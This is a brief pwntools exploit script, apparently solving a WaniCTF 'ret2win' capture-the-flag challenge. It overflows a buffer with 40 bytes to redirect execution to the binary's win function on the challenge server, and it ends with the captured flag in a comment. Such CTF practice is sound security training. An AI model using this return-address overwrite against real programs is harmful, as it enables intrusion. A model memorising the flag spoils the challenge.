from pwn import *

HOST = "ret2win-pwn.wanictf.org"
PORT = 9003
file = "./chall"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
#io = process(file)
io = remote(HOST, PORT)

io.sendlineafter(b"> ", b"A"*40+p64(e.sym["win"]))

io.interactive()
#FLAG{f1r57_5739_45_4_9wn3r}
